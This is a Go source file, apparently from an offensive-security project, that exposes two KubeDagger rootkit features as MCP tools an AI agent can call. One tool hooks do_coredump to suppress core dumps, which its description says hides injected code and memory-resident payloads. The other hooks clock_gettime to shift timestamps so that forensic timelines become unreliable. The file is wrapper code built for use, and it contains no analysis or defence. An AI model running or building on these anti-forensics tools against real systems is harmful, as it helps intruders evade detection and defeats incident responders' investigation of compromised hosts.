package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// Coredump Suppress

type CoredumpSuppressInput struct {
	Action string `json:"action"`
	PID    int    `json:"pid,omitempty"`
	Target string `json:"target,omitempty"`
}

type CoredumpSuppressTool struct {
	exec executor.Executor
}

func NewCoredumpSuppress(exec executor.Executor) *CoredumpSuppressTool {
	return &CoredumpSuppressTool{exec: exec}
}

func (t *CoredumpSuppressTool) Name() string { return "kubedagger_coredump_suppress" }

func (t *CoredumpSuppressTool) Description() string {
	return "Suppress core dump generation for specific processes by hooking do_coredump. Prevents crash analysis from revealing injected code or memory-resident payloads when a compromised process crashes."
}

func (t *CoredumpSuppressTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["suppress", "allow", "status"],
				"description": "Coredump suppression action"
			},
			"pid": {
				"type": "integer",
				"description": "Target process ID"
			},
			"target": {
				"type": "string",
				"description": "Target process name pattern"
			}
		},
		"required": ["action"]
	}`)
}

func (t *CoredumpSuppressTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CoredumpSuppressInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Target, "target"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"coredump-suppress", "--action", input.Action}
	if input.PID > 0 {
		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
	}
	if input.Target != "" {
		args = append(args, "--target", input.Target)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger coredump-suppress failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Coredump Suppress: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Suppression active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// Timeskew

type TimeskewInput struct {
	Action string `json:"action"`
	Offset string `json:"offset,omitempty"`
	PID    int    `json:"pid,omitempty"`
	Target string `json:"target,omitempty"`
}

type TimeskewTool struct {
	exec executor.Executor
}

func NewTimeskew(exec executor.Executor) *TimeskewTool {
	return &TimeskewTool{exec: exec}
}

func (t *TimeskewTool) Name() string { return "kubedagger_timeskew" }

func (t *TimeskewTool) Description() string {
	return "Manipulate time perception for specific processes by hooking clock_gettime. Makes forensic timeline analysis unreliable by shifting timestamps in logs, files, and network packets from targeted processes."
}

func (t *TimeskewTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["skew", "restore", "status"],
				"description": "Timeskew action"
			},
			"offset": {
				"type": "string",
				"description": "Time offset (e.g., '-2h', '+30m', '-7d')"
			},
			"pid": {
				"type": "integer",
				"description": "Target process ID"
			},
			"target": {
				"type": "string",
				"description": "Target process name"
			}
		},
		"required": ["action"]
	}`)
}

func (t *TimeskewTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input TimeskewInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Offset, "offset"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Target, "target"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"timeskew", "--action", input.Action}
	if input.Offset != "" {
		args = append(args, "--offset", input.Offset)
	}
	if input.PID > 0 {
		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
	}
	if input.Target != "" {
		args = append(args, "--target", input.Target)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger timeskew failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Timeskew: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Timeskew active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
